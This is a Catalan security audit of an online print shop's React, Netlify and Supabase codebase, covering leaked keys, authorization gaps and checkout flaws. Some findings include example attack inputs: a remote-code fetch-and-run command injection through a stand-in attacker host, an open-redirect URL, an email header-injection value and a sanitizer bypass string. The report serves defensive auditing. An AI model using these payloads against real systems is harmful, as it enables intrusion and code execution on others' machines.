# Diagnosi de seguretat — Higgins Gràfic Ecommerce

**Data:** 2026-09-12
**Abast:** estructura del projecte i seguretat de `src/`, `netlify/functions/`, `supabase/`, `public/`, `scripts/`, configuració de desplegament i cadena de subministrament.
**Mètode:** anàlisi estàtica de codi, inspecció de l'historial de Git, auditoria de dependències (`npm audit`, `npm outdated`) i verificació de l'exposició pública del repositori. No s'han executat exploits ni s'ha accedit a cap sistema de producció.
**Restricció:** totes les comprovacions són de només lectura. No s'ha modificat cap fitxer del projecte.

> **Nota sobre secrets:** aquest informe no reprodueix cap credencial. Les claus s'identifiquen per la seva ubicació i per una empremta SHA-256 curta.

---

## 1. Resum executiu

L'aplicació està **molt ben construïda pel que fa a l'arquitectura de pagaments**: els preus es recalculen sempre al servidor, la signatura dels webhooks de Stripe es verifica correctament, hi ha un model d'autorització basat en la taula `staff` amb policies RLS ben dissenyades, i s'han eliminat correctament les claus privades del codi client.

El problema no és el disseny: és **l'operació i la higiene de secrets**. Hi ha tres fets que, combinats, són greus:

1. **El repositori de GitHub és públic** (`higginsgrafic/higginsgrafic-ecommerce-dev`, `"private": false`).
2. **Hi ha una clau `service_role` de Supabase versionada** en aquest repositori públic. Aquesta clau bypassa completament les RLS: equival a control total de la base de dades de producció.
3. **Hi ha la clau de l'API de Gelato versionada**, i a més el bundle antic del navegador (`dist-prod/`) també està versionat i la conté incrustada.

A aquests cal afegir un seguit de problemes d'autorització i de validació al voltant del checkout que, sense ser catastròfics per si sols, sí que són explotables.

**Puntuació global:** la base és sòlida, però **l'estat actual no és segur per operar en producció** fins que no es rotin les claus filtrades.

| Severitat | Nombre |
|---|---|
| Crític | 3 |
| Alt | 7 |
| Mitjà | 15 |
| Baix | 9 |

---

## 2. Estructura del projecte

### 2.1 Stack

| Capa | Tecnologia |
|---|---|
| Frontend | React 18 + Vite 7, React Router 6, Tailwind 3, Radix UI, Framer Motion |
| Backend | Netlify Functions (Node, ESM) + Supabase Edge Functions (Deno) |
| Base de dades | Supabase (PostgreSQL) amb RLS |
| Pagaments | Stripe (Payment Intents + webhooks) |
| Fulfillment | Gelato (print on demand) |
| Correu | Resend + React Email |
| Observabilitat | Sentry, Plausible |
| Desplegament | Netlify (`netlify.toml`), PWA (`public/sw.js`, `public/manifest.json`) |

### 2.2 Mapatge de directoris

```
├── src/                        Frontend React
│   ├── api/                    Clients: supabase-products, stripe, storage, gelato, client
│   ├── components/             Components (fullwide/ = checkout i megaslide)
│   ├── contexts/               AdminContext, AuthContext, ProductContext, CartContext
│   ├── hooks/                  useOrders, useProfile, useProducts, useRouteLayout
│   ├── lib/                    sentry.js
│   ├── pages/                  ~70 pàgines (botiga, admin, previews de dev)
│   ├── routes/AppRoutes.jsx    Definició de rutes
│   └── utils/                  sanitizeHtml, validation
│
├── netlify/functions/          API serverless (12 fitxers)
│   ├── create-payment-intent.js   Crea PI + comanda (preus server-side) ✅
│   ├── stripe-webhook.js          Verifica signatura + fulfillment ✅
│   ├── orders.js                  GET/PATCH comandes (admin gatejat) ✅
│   ├── shipping-rates.js          Correos + Supabase (GET públic, POST admin)
│   ├── send-message.js            Formulari de contacte
│   └── _auth/_cors/_email/_gelato/_rate-limit/_token.js   Mòduls interns
│
├── supabase/
│   ├── migrations/             35 migracions SQL
│   ├── functions/              upload-media, gelato-proxy, download-project (Deno)
│   └── (sense config.toml)     ⚠️ configuració no versionada
│
├── scripts/                    Utilitats de build, sync i manteniment
├── public/                     Actius estàtics + service worker
├── tests/                      Vitest (unit) + Playwright (e2e)
└── dist/ · dist-prod/          Builds (dist-prod SÍ versionat ⚠️)
```

### 2.3 Flux de compra

```
CheckoutContent.jsx
  └─ POST /api/create-payment-intent  { items: [{gelatoVariantId, quantity}], email, userId }
       ├─ Recalcula preus des de product_variants (MAI es refia del client) ✅
       ├─ Aplica shipping_config + IVA 21% inclòs ✅
       ├─ Crea fila a `orders` (estat 'pendent') + token de seguiment
       └─ Crea Stripe PaymentIntent amb l'import calculat
  └─ stripe.confirmCardPayment(clientSecret, { billing_details })
       └─ Stripe → POST /api/stripe-webhook
            ├─ constructEvent() amb STRIPE_WEBHOOK_SECRET ✅
            ├─ Idempotència via processed_stripe_events ✅
            ├─ orders.status = 'confirmada'
            └─ createGelatoOrderServer(order) → API Gelato
```

**Punt de fractura detectat:** les dades d'enviament (`first_name`, `address`, `city`, `postal_code`) **no s'envien mai al servidor**. Vegeu C3.

### 2.4 Model d'autorització

Dues capes, amb una discrepància important:

- **Servidor (correcte):** `_auth.js:verifyAdmin()` valida el JWT amb `supabase.auth.getUser()` i comprova que existeixi una fila activa a la taula `staff`. Les RLS fan servir `public.is_admin()`, que consulta `staff`. Això és sòlid.
- **Client (incorrecte):** `AdminContext.jsx` decideix si ets admin comparant el teu correu amb la variable `VITE_ADMIN_EMAILS`. Vegeu A1.

---

## 3. Troballes crítiques

### C1 — Clau `service_role` de Supabase versionada en un repositori públic

**Ubicació:** `scripts/setup-netlify-env.sh:41` (versionat a `origin/main`, commit `2a86825`)

**Evidència:**
```
$ git ls-files scripts/setup-netlify-env.sh
scripts/setup-netlify-env.sh

$ git grep -l "<fingerprint>" origin/main
origin/main:scripts/setup-netlify-env.sh
```

Payload del JWT (decodificat, sense signatura):
```json
{"iss":"supabase","ref":"jnuuejlxuyqhhkfucuxg","role":"service_role",
 "iat":1766418088,"exp":2081994088}
```
- `role: service_role` → **bypassa totes les RLS**
- `exp` = 2035-12-23 → vigent aproximadament 9 anys més
- Empremta SHA-256 (12): `sQpODlILcyXg…`

**Exposició confirmada:** el repositori és públic.
```
$ curl -s https://api.github.com/repos/higginsgrafic/higginsgrafic-ecommerce-dev | grep private
"private": false,   "visibility": "public"

$ curl -o /dev/null -w "%{http_code}" \
  https://raw.githubusercontent.com/higginsgrafic/.../main/scripts/setup-netlify-env.sh
200
```

**Impacte:** qualsevol persona pot descarregar aquest fitxer ara mateix i, amb aquesta clau, **llegir, modificar i esborrar qualsevol taula i qualsevol objecte d'Storage del projecte de producció**: comandes amb dades personals dels clients, adreces, perfils, la taula `staff`, i els fitxers dels buckets `media` i `project-downloads`. També pot crear-se una fila a `staff` i escalar privilegis de manera persistent.

**Correcció immediata:**
1. **Rotar la clau a Supabase Dashboard → Settings → API** (i desactivar les claus JWT legacy si no es fan servir).
2. Verificar l'activitat anòmala: `auth.users`, `staff`, `orders`, canvis a `products`/`media_pages` des de l'1 de desembre de 2025.
3. Buidar el fitxer de secrets i passar a variables d'entorn de Netlify.
4. Purgar l'historial (`git filter-repo` o BFG) i fer force-push, o bé **considerar la clau permanentment compromesa**. Tingues en compte que, si el repositori ha estat clonat o indexat per tercers, esborrar-lo no desfà l'exposició: la rotació és l'única mesura efectiva.
5. Revisar si el repositori ha de ser públic; si no cal, fer-lo privat.

**Nota:** el `.env` local ja fa servir el format nou `sb_secret_…`. Si les claus legacy estan desactivades al panell de Supabase, el risc baixa molt; **cal verificar-ho explícitament**, ja que les claus JWT legacy continuen vàlides per defecte.

---

### C2 — Clau de l'API de Gelato versionada i incrustada al bundle del navegador

**Ubicacions versionades:**
- `scripts/setup-netlify-env.sh:26`
- `GELATO_SETUP.md:7`
- `dist-prod/assets/index-QcYvzX29.js` (bundle del navegador)

**Evidència:**
```
$ git grep -l "<prefix-clau-gelato>" origin/main
origin/main:GELATO_SETUP.md
origin/main:dist-prod/assets/index-QcYvzX29.js
origin/main:scripts/setup-netlify-env.sh
```

**Confirmació que la clau és la vigent:** la clau del `.env` local actual és **la mateixa** que la filtrada.

**Impacte:** la variable tenia prefix `VITE_`, de manera que Vite la incrusta literalment al JavaScript del client. Qualsevol visitant del lloc web pot extreure-la amb les DevTools del navegador, sense necessitat de GitHub. Amb aquesta clau es poden **crear comandes reals a Gelato amb el compte de l'empresa** (cost econòmic directe), consultar catàlegs, preus i comandes, i esgotar quotes.

**Estat actual:** la remediació ja es va fer al codi (`src/api/gelato.js:10` documenta que la clau s'ha tret del client; `verify-security.js` comprova que no hi sigui). El bundle actual `dist/` és net. **Però la clau segueix compromesa** perquè està publicada al repositori, i és la mateixa que s'usa avui.

**Correcció:**
1. **Rotar la clau a Gelato Dashboard → Settings → API Keys.**
2. Esborrar la clau dels tres fitxers versionats.
3. No tornar a usar mai el prefix `VITE_` per a secrets: tot el que comença per `VITE_` acaba al navegador.
4. Canalitzar totes les crides a Gelato per l'edge function `gelato-proxy`, que ja existeix.

---

### C3 — Les comandes pagades no tenen dades d'enviament: el fulfillment automàtic fallarà

**Ubicacions:**
- `src/api/stripe.js:28-34` — el cos de la petició no inclou cap dada d'adreça
- `src/components/fullwide/CheckoutContent.jsx:341-353` — l'adreça només s'envia a `billing_details` de Stripe
- `netlify/functions/create-payment-intent.js:160-177` — l'INSERT a `orders` no omple `first_name`, `last_name`, `address`, `address2`, `city`, `postal_code`, `country`, `phone`
- `netlify/functions/_gelato.js:90-99` — `buildGelatoOrderPayload()` llegeix precisament aquests camps

**Anàlisi:** el client recull l'adreça al formulari i l'envia a Stripe com a `billing_details`, però **no l'envia mai al backend propi**. El backend crea la fila d'`orders` amb tots els camps d'adreça a `NULL`. Quan el webhook confirma el pagament i crida `createGelatoOrderServer()`, el payload que s'envia a Gelato té `shippingAddress` amb `firstName`, `lastName`, `addressLine1`, `city` i `postCode` buits.

**Conseqüència:** Gelato rebutjarà la comanda per validació (error 4xx → `GELATO_DATA_ERROR` → el webhook retorna `skip`). La comanda queda en estat `confirmada` **sense `gelato_order_id`** i no s'envia mai a producció. El client ha pagat i no rebrà el producte tret que algú ho detecti i ho gestioni manualment. No hi ha cap alerta automàtica per a aquest cas.

**Correcció:**
1. Enviar les dades d'enviament a `create-payment-intent` i desar-les a la fila d'`orders` (validant-les al servidor).
2. Alternativament, habilitar `shipping_address_collection` a Stripe i recuperar l'adreça del PaymentIntent al webhook.
3. Afegir una alerta (correu a l'admin) quan una comanda quedi `confirmada` sense `gelato_order_id`.

---

## 4. Troballes altes

### A1 — L'autorització d'administrador es decideix al client, amb fail-open

**Ubicació:** `src/contexts/AdminContext.jsx:64-79, 128, 149, 182-193`

```js
const allowedAdminEmails = (() => {
  const raw = (import.meta?.env?.VITE_ADMIN_EMAILS || '').toString().trim();
  if (!raw) return null;                       // llista buida → null
  ...
})();

const isAllowedAdminEmail = (email) => {
  ...
  if (!allowedAdminEmails) return true;        // ⚠️ FAIL-OPEN
  return allowedAdminEmails.has(normalized);
};
```

**Dos problemes:**

1. **Fail-open:** si `VITE_ADMIN_EMAILS` no està definida a Netlify, `isAllowedAdminEmail()` retorna `true` per a **qualsevol** correu. Com que l'autoregistre de Supabase està disponible, qualsevol persona que es registri obtindria `isAdmin = true` al client.
2. **El control és al client:** la llista ve d'una variable `VITE_` (per tant, incrustada al bundle i visible per a tothom, incloent-hi el correu de l'administrador). Qualsevol pot activar `isAdmin` amb les DevTools.

**Matís important (verificat):** la frontera real de dades és el servidor. Les escriptures estan protegides per RLS amb `public.is_admin()` sobre la taula `staff` (`20260826100000_authorization_model_and_rls_fix.sql:57-70, 238-252`), i els endpoints (`orders.js`, `upload-media`, `gelato-proxy`) verifiquen `staff`. Per tant, **això no dóna accés d'escriptura a la base de dades**.

**Impacte real:** exposició de la interfície d'administració, de lectures no públiques (productes inactius, `pricing_config`, `media_pages`) i divergència perillosa entre la UI i la BD. A més, si algun endpoint futur es refiés del client, l'escalada seria immediata.

**Correcció:** consultar `staff` (o `is_admin()`) per determinar el rol, i canviar el fail-open per `return false`.

---

### A2 — Open redirect a `/ec-preview-lite?redirect=`

**Ubicació:** `src/pages/ECPreviewLitePage.jsx:16, 152-163`

```js
const redirectUrl = (params.get('redirect') || '').trim() || ...;

const doRedirect = () => {
  if (debug) return;
  const target = String(redirectUrl || '').trim();
  if (!target) return;
  if (target.startsWith('http://') || target.startsWith('https://')) {
    window.location.replace(target);   // ⚠️ destinació arbitrària
    return;
  }
  navigate(target);
};
```

**Explotació:** `https://higginsgrafic.com/ec-preview-lite?redirect=https://evil.example&redirectMode=immediate` redirigeix l'usuari al lloc de l'atacant utilitzant el domini oficial com a referent de confiança. És el vector clàssic de phishing per a botigues.

**Relació amb dependències:** l'advisory GHSA-jjmj-jmhj-qwj2 de `react-router-dom` (A7) és precisament un open redirect. Ambdós problemes s'han de corregir.

**Correcció:** llista blanca d'hosts o de rutes internes; o eliminar el paràmetre `redirect` de la query i deixar només la variable d'entorn.

---

### A3 — Execució remota de comandes al servidor de desenvolupament

**Ubicació:** `vite.config.js:80-88, 126-134`

```js
const commitMessage = url.searchParams.get('message') || 'chore(catalog): ...';
execSync(`git add ${CONFIG_REL_PATH}`, { cwd: __dirname, stdio: 'ignore' });
execSync(`git commit -m "${commitMessage.replace(/"/g, '\\"')}"`, { cwd: __dirname, stdio: 'ignore' });
```

```js
server: { host: '0.0.0.0', port: 3003, ... }
```

**Anàlisi:** el middleware `/__dev/component-catalog` accepta `POST` sense autenticació. El paràmetre `message` s'interpola en una ordre de shell, i l'escapat només cobreix les cometes dobles: `$(...)`, cometes invertides, `;`, `|` i `&&` **no** s'escapen. Com que el servidor escolta a `0.0.0.0`, qualsevol dispositiu de la xarxa local hi pot enviar peticions.

**Explotació:** `POST /__dev/component-catalog?commit=1&message=$(curl attacker/x|sh)` → execució arbitrària de comandes a la màquina del desenvolupador.

**Agreujant:** aquesta és la màquina que conté el `.env` amb **totes les claus de producció** (Stripe, Supabase service_role, Resend, Gelato). Un compromís aquí equival a un compromís total.

**Correcció:** `execFileSync('git', ['commit', '-m', commitMessage])` (sense shell), validar la longitud del missatge, i `host: '127.0.0.1'` per defecte.

---

### A4 — El formulari de contacte és un relay de correu obert

**Ubicació:** `netlify/functions/send-message.js:32-107`, `netlify/functions/_email.js:55`

```js
const { name, email, subject, message, orderNumber } = JSON.parse(event.body || '{}');
if (!email || !message) { /* ... */ }          // ⚠️ no valida el format de l'email
...
reply_to: email,                                // ⚠️ capçalera controlada pel client
subject: `Nou missatge de ${name || email}: ${subject || ...}`,  // ⚠️ sense sanejar CRLF
```

I a `_email.js:55`: `const to = payload.email || payload.to;` — s'envia el correu de confirmació a l'adreça que proporcioni el client.

**Impacte:**
- **Email bombing:** un atacant pot fer que el servidor enviï correus a adreces arbitràries amb el contingut que vulgui, des del domini `higginsgrafic.com`. Això crema la reputació del domini (llistes negres, SPF/DKIM) i la quota de Resend.
- **Email header injection:** `subject` i `email` s'interpolen en capçaleres sense sanejar. Si Resend no ho bloqueja, es podrien injectar capçaleres addicionals (`\r\nBcc:`).
- No hi ha CAPTCHA ni honeypot.

**Atenuants:** hi ha rate limiting (5 per 5 minuts per IP) i l'email d'admin sí que escapa l'HTML amb `escapeHtml()`. Però el rate limit és fail-open (vegeu A5).

**Correcció:** validar el format de l'email i el domini (o exigir verificació), sanejar `subject` de caràcters de control, afegir CAPTCHA (Turnstile/hCaptcha) i limitar la longitud dels camps.

---

### A5 — Inserció anònima oberta a `messages` i `rate_limit_log`

**Ubicació:** `supabase/migrations/20260826100000_authorization_model_and_rls_fix.sql:436-439` i `20260826110000_orders_state_machine.sql:212-215`

```sql
CREATE POLICY "Anyone can submit messages" ON messages FOR INSERT
  TO anon, authenticated WITH CHECK (true);

CREATE POLICY "Anyone can insert rate limit log" ON rate_limit_log FOR INSERT
  TO anon, authenticated WITH CHECK (true);
```

**Impacte:**
- `messages`: qualsevol pot inserir files arbitràries directament via PostgREST amb la clau `anon` (que és pública), **saltant-se completament** el rate limiting i la validació de la Netlify function. Spam massiu i inflat de taula.
- `rate_limit_log`: la taula només té una política `SELECT` per a `service_role`, així que les dades no es filtren. Però la inserció anònima permet inflar-la massivament. Com que `check_rate_limit()` fa un `COUNT(*)` sobre aquesta taula, un atacant pot degradar el rendiment de la funció fins a provocar un timeout → i com que el rate limiter és **fail-open** (`_rate-limit.js:45-48`), un timeout **desactiva el rate limiting de tota la plataforma**.

**Correcció:** eliminar la política `"Anyone can insert rate limit log"` (les Netlify functions usen `service_role`, no la necessiten). Per a `messages`, canalitzar les insercions exclusivament per l'endpoint o afegir restriccions de longitud i una neteja periòdica.

---

### A6 — `gelato-proxy`: CORS obert amb accions no autenticades

**Ubicació:** `supabase/functions/gelato-proxy/index.ts:6-10, 101-119`

```ts
const corsHeaders = { "Access-Control-Allow-Origin": "*", ... };
...
const ADMIN_ACTIONS = new Set(['order', 'stores', 'store-products', 'store-product', 'template']);
```

Les accions `catalogs`, `catalog`, `product` i `prices` **no són a `ADMIN_ACTIONS`**, de manera que no requereixen autenticació i fan servir la `GELATO_API_KEY` del servidor.

**Impacte:** qualsevol persona, des de qualsevol origen, pot fer servir l'edge function com a proxy gratuït cap a l'API de Gelato amb la clau de l'empresa: consum de quota, enumeració de catàleg i de preus (informació comercial sensible), i possible denegació de servei per esgotament de límit.

**Correcció:** exigir autenticació per a totes les accions, restringir `Access-Control-Allow-Origin` als dominis propis, i afegir rate limiting.

---

### A7 — `react-router-dom` 6.30.3 amb advisories d'open redirect

**Ubicació:** `dist/assets/react-vendor-*.js` (chunk de 165 KB), declarat a `vite.config.js:150`

| GHSA | Descripció | Instal·lat | Corregeix |
|---|---|---|---|
| GHSA-jjmj-jmhj-qwj2 | open redirect → XSS | 6.30.3 | 6.30.6 |
| GHSA-2j2x-hqr9-3h42 | open redirect (`//`) | 6.30.3 / router 1.23.2 | 6.30.6 / 1.23.4 |
| GHSA-wrjc-x8rr-h8h6 | open redirect via backslash | 6.30.3 | 7.18.0+ |
| GHSA-337j-9hxr-rhxg | injecció al constructor (SSR) | 6.30.3 | **no aplicable** (SPA) |

**Correcció:** `npm i react-router-dom@6.30.6` elimina tres de les quatre. Les restants requereixen migrar a v7.18+.

---

## 5. Troballes mitjanes

### M1 — CSP amb `script-src 'unsafe-inline'`
**Ubicació:** `netlify.toml:94`

La resta de la CSP està bé (`object-src 'none'`, `frame-ancestors 'none'`, `base-uri 'self'`, sense `unsafe-eval`). Però `'unsafe-inline'` **anul·la la CSP com a mitigació d'XSS**: qualsevol injecció s'executa. És necessari perquè hi ha scripts inline a `index.html`. Correcció: passar a nonces o hashes, i moure els scripts inline a fitxers externs. Afegir també `form-action 'self'` (no hereta de `default-src`).

### M2 — DOM XSS al gestor global d'errors
**Ubicació:** `index.html:140-156`, `index-prod.html:96-111`

```js
root.innerHTML = `...${String(details.name || '')}: ${details.message}...${e.filename}...`;
```
El missatge d'error s'insereix via `innerHTML` sense escapar. Combinat amb M1 (`unsafe-inline`), si s'aconsegueix un error amb contingut controlat abans que React munti, s'executa codi. Correcció: `textContent` o escapar.

### M3 — `sanitizeHtml` basat en expressions regulars, bypassable
**Ubicació:** `src/utils/sanitizeHtml.js:12-27`

El propi autor ho reconeix al comentari. Punts febles: no decodifica entitats HTML (`href="jav&#x61;script:..."` passa el filtre), no cobreix `<svg>`/`<math>` amb `xlink:href` ni `<style>@import`. S'usa amb `dangerouslySetInnerHTML` a `FulfillmentSettingsPage.jsx:545,685,709` (contingut provinent de la descripció de producte de Gelato/BD) i `EmailPreviewPage.jsx:424,530` (dades mock). Correcció: DOMPurify amb allow-list.

### M4 — Sobreexposició de dades a `orders`
**Ubicació:** `netlify/functions/orders.js:80, 106, 130, 150`

Totes les consultes fan `select('*')`, retornant al client camps interns com `tracking_token_hash`, `payment_intent_id`, `idempotency_key` i `user_id`. No és explotable per si sol, però vulnera el principi de minimització de dades. Correcció: llistar explícitament només els camps necessaris.

### M5 — Sentry Session Replay grava text sense emmascarar (RGPD)
**Ubicació:** `src/lib/sentry.js:30-40`

```js
replayIntegration({ maskAllText: false, blockAllMedia: true, maskAllInputs: true })
```
Els inputs sí que s'emmascaren, però **el text de la pàgina no**: noms, adreces i números de comanda visibles com a text es poden enregistrar i enviar a un tercer. Correcció: `maskAllText: true` i bloquejar selectors del checkout i del perfil.

### M6 — Stripe possiblement en mode test
**Ubicació:** `.env:VITE_STRIPE_PUBLISHABLE_KEY`, `.env:STRIPE_SECRET_KEY`, `dist-prod/assets/index-QcYvzX29.js`, `src/api/stripe.js:10`

Tant el `.env` local com el bundle de `dist-prod` contenen claus `pk_test_`/`sk_test_`. **No s'ha pogut verificar quines claus estan configurades al context de producció de Netlify** (l'endpoint de Netlify no és accessible des d'aquí). Si producció fa servir claus de test, qualsevol persona podria "pagar" amb la targeta de prova `4242 4242 4242 4242` i generar **comandes reals a Gelato amb cost real**, sense que entri cap diner. **Aquesta és la comprovació més urgent després de la rotació de claus.** Correcció: verificar `netlify env:list --context production` i confirmar que comencen per `pk_live_`/`sk_live_`.

### M7 — `dist-prod/` versionat (2.903 fitxers)
**Ubicació:** `.gitignore:11-12` (ignora `dist` però no `dist-prod`)

Conté artefactes de build antics (2595 `.webp`, 100 `.js`), incloent-hi el bundle amb la clau de Gelato incrustada (C2). Correcció: afegir `dist-prod` al `.gitignore`, `git rm -r --cached dist-prod` i purgar l'historial.

### M8 — Idempotència ineficaç a `create-payment-intent`
**Ubicació:** `netlify/functions/create-payment-intent.js:153, 184-196`

```js
const idempotencyKey = `pi_${Date.now()}_${Math.random().toString(36).slice(2, 10)}`;
const paymentIntent = await stripe.paymentIntents.create({ amount: ..., ... });
```

La clau es genera amb `Date.now()` + `Math.random()` (no és determinista ni única de manera fiable) i **no es passa com a opció `idempotencyKey` a Stripe**. Un doble clic o un reintent de xarxa crea dues files a `orders` i dos PaymentIntents. La columna `idempotency_key` té restricció `UNIQUE`, però com que el valor sempre és nou, no protegeix res. Correcció: generar la clau al client (o derivar-la del carret) i passar-la com a `{ idempotencyKey }` a Stripe; o fer servir l'idempotency key de Stripe com a font de veritat.

### M9 — El webhook no valida l'import ni l'estat previ
**Ubicació:** `netlify/functions/stripe-webhook.js:117-137`

L'actualització és `.update({ status: 'confirmada' }).eq('payment_intent_id', paymentIntent.id)` sense comprovar:
- que `paymentIntent.amount_received` coincideixi amb `orders.total`
- que l'estat actual sigui `pendent` (una comanda ja `entregada` tornaria a `confirmada` per un event duplicat o fora d'ordre, degradant l'estat)

Correcció: afegir ambdues comprovacions i registrar discrepàncies.

### M10 — `email` i `userId` controlats pel client a l'alta de comanda
**Ubicació:** `netlify/functions/create-payment-intent.js:128-132, 160-177`

`email` i `userId` s'accepten del cos de la petició sense verificar-los contra el JWT. Un atacant pot crear comandes assignades al `user_id` d'una altra persona (contaminació del seu historial) o amb un correu aliè. Correcció: derivar tots dos del JWT quan n'hi hagi, i validar el format de l'email.

### M11 — `upload-media`: CORS obert i SVG permès
**Ubicació:** `supabase/functions/upload-media/index.ts:4-8, 16, 77`

L'autenticació d'admin és correcta (`verifyAdmin` consulta `staff`), però `Access-Control-Allow-Origin: *` és innecessari i `image/svg+xml` està a l'allow-list: un SVG pot contenir JavaScript i es serveix des d'un bucket públic. El risc d'XSS sobre el domini principal és baix (és un altre origen), però facilita el phishing. El `path` no es valida contra traversal. Correcció: restringir l'origen, treure SVG i validar el `path`.

### M12 — Edge functions sense configuració versionada de JWT
**Ubicació:** `supabase/` (no existeix `config.toml`)

No hi ha cap `supabase/config.toml`, de manera que la configuració `verify_jwt` de les edge functions no està versionada ni és auditable. A més, `download-project` retorna `error.message` a la resposta (fuita d'informació) i és un placeholder 501 (codi mort).

### M13 — JSON-LD sense escapament: XSS emmagatzemat d'admin cap a visitants
**Ubicació:** `src/components/SEO.jsx:119-134`, `src/components/SEOProductSchema.jsx:58-61`

```jsx
<script type="application/ld+json">{JSON.stringify(schema)}</script>
```

Verificat a `node_modules/react-helmet/lib/Helmet.js`: els fills d'un `<script>` s'insereixen via `innerHTML`/`dangerouslySetInnerHTML` **sense escapar**. Si el nom o la descripció d'un producte conté la seqüència `</script>`, es trenca el tag i s'injecta HTML/JS a totes les pàgines de producte. L'escriptura de productes requereix admin (RLS), de manera que és un XSS emmagatzemat que va d'admin cap a visitants. Correcció: `JSON.stringify(schema).replace(/</g, '\\u003c')`.

### M14 — Validació de pujada de fitxers només al client i basada en el MIME declarat
**Ubicació:** `src/components/MediaPicker.jsx:57-63`, `src/pages/AdminMediaPage.jsx:65-77`, `src/api/storage.js:40-47`

El filtre es basa en `file.type.startsWith('image/'|'video/'|'audio/')`, un valor **declarat pel navegador i manipulable**, i **no es comprova la mida** tot i que la interfície anuncia 50 MB. La validació real del servidor (`upload-media`) és correcta, però permet `image/svg+xml` (vegeu M11). A més, `storage.js:40-47` envia la **clau `anon`** com a bearer en lloc del token de l'usuari, de manera que la via de pujada a l'edge function falla sistemàticament per als administradors i cau al mètode directe.

### M15 — El formulari de contacte accepta adjunts i els descarta en silenci
**Ubicació:** `src/components/megaslide/MegaslidePagina4.jsx:727-733, 160-163, 181-192`

Hi ha un `<input type="file" multiple>` sense `accept` ni límit de mida que acumula `attachments`, i es construeix un `FormData` amb els fitxers, però la petició s'envia com a `JSON.stringify({name, email, subject, message})`: **els adjunts no s'envien mai i l'usuari no rep cap avís**. És un defecte de confiança (l'usuari creu que ha adjuntat un fitxer). Si algú el "repara" enviant el `FormData`, caldrà afegir validació de tipus, mida i nombre de fitxers al servidor.

---

## 6. Troballes baixes

| # | Troballa | Ubicació |
|---|---|---|
| B1 | **94 vulnerabilitats a `npm audit`** (1 crítica, 53 altes, 34 moderades, 6 baixes), gairebé totes del toolchain de dev (`netlify-cli`, `eslint`, `@babel/core`, `sharp`/`node-tar`). No arriben al bundle, però la màquina de dev conté les claus de producció. | `package.json` |
| B2 | `postcss` i `tailwindcss` declarats a `dependencies` en lloc de `devDependencies`: contaminen l'audit de producció. `postcss` 8.5.15 té dues advisories altes (corregeix a 8.5.28). | `package.json` |
| B3 | Drift gran de versions: `@stripe/stripe-js` 2.4.0→9.16.0, `@stripe/react-stripe-js` 2.9.0→6.10.0, `@supabase/supabase-js` 2.57.4→2.116.0. Sense advisories actuals, però perden pedaços de seguretat. | `package.json` |
| B4 | Injecció de filtre PostgREST latent: `searchTerm` s'interpola sense escapar. Actualment és codi mort (la cerca es fa en memòria). | `src/api/supabase-products.js:389` |
| B5 | Contrasenya suggerida generada amb `Math.random()` (no criptogràfic). | `src/pages/ResetPasswordPage.jsx:21-34` |
| B6 | Política de contrasenyes inconsistent: `validatePassword` (8+, majúscula, minúscula, dígit) existeix però no s'usa; el registre només exigeix 6 caràcters. | `src/utils/validation.js:110-116`, `RegisterOverlay.jsx:44` |
| B7 | `window.open(link, '_blank')` sense `noopener` (la resta d'enllaços del projecte sí que el porten). | `src/components/OffersHeader.jsx:21-31` |
| B8 | Rutes de desenvolupament publicades al bundle i HTML d'assaig a `public/` que es copien a `dist` (incloent-hi `preview-password-reset.html`, que imita un correu de restabliment). | `public/`, `AppRoutes.jsx` |
| B9 | `robots.txt` publica rutes internes i apunta a un domini incoherent (`grafic.cat` en lloc de `higginsgrafic.com`). `.DS_Store` versionats. `backup-complet-2026-08-11.bundle` (1,4 GB) a l'arrel. | `public/robots.txt` |

---

## 7. Punts verificats i correctes

Cal distingir el que s'ha comprovat del que no:

**Arquitectura de pagaments**
- Els preus es recalculen sempre al servidor des de `product_variants`; el client **no envia mai** imports ni descomptes. Verificat a `create-payment-intent.js:19-105` i `stripe.js:28-34`.
- La quantitat es limita a l'interval 1-100 i el total a 0,50 €–5.000 €.
- La moneda es força a EUR.
- La signatura del webhook de Stripe es verifica amb `constructEvent()` (`stripe-webhook.js:82-90`).
- Idempotència de webhooks via `processed_stripe_events` amb `event_id UNIQUE`.
- El fulfillment a Gelato és idempotent (comprova `gelato_order_id` abans d'actuar).
- `POST /api/orders` està desactivat (403): les comandes només es creen via `create-payment-intent`.
- `PATCH /api/orders` requereix admin verificat contra la taula `staff`.

**Base de dades**
- El model d'autorització de la migració `20260826100000` és sòlid: `is_admin()` és `SECURITY DEFINER` amb `search_path` fixat, totes les escriptures estan gatejades per admin, i les polítiques antigues permissives es dropegen explícitament.
- Les taules `orders`, `processed_stripe_events`, `rate_limit_log` i `order_events` tenen RLS activat i només `service_role` hi pot escriure.
- El token de seguiment és de 32 bytes aleatoris (`crypto.randomBytes`), es desa **només com a hash SHA-256** i té caducitat.
- `processed_stripe_events` i `idx_orders_tracking_token_hash` tenen els índexs adequats.

**Frontend**
- La sessió de Supabase viu **només en memòria** (`persistSession: false`, `autoRefreshToken: false`): no hi ha JWT a `localStorage`, cosa que elimina el robatori de token via XSS.
- Cap `eval`, `new Function`, `document.write` ni `srcdoc`.
- Els únics `dangerouslySetInnerHTML` amb dades controlables estan coberts per M3; la resta són SVG locals hardcodejats.
- Tots els `<a target="_blank">` porten `rel="noopener noreferrer"` (l'única excepció és B7).
- El service worker s'autodesregistra i esborra totes les caches: no pot servir contingut obsolet.
- Cap clau privada incrustada a `src/` ni `public/`.

**Cadena de subministrament**
- `package-lock.json` versionat, `lockfileVersion` 3, 1.943 de 1.945 entrades amb `integrity`.
- Cap dependència des de git, tarball o registre no oficial: tots els `resolved` apunten a `registry.npmjs.org`.
- Sense `postinstall` propi; `prebuild` i `prepare` són locals i innocus.
- `.husky/pre-commit` només regenera miniatures.
- `.env` mai versionat a cap commit i correctament ignorat.
- Cap fitxer `.pem`, `.key` ni credencial versionat (a part de C1/C2).
- `netlify.toml` té HSTS amb preload, `X-Frame-Options: DENY`, `X-Content-Type-Options`, `Referrer-Policy` i `Permissions-Policy`.

---

## 8. Pla de correcció prioritzat

El pla té **dues vies paral·leles** que no s'han de confondre: una és un **incident de seguretat** (les claus filtrades, amb terminis i investigació) i l'altra és el **backlog de remediació** (la resta). Barrejar-les és l'error més habitual: es perd temps arreglant codi mentre la credencial segueix viva.

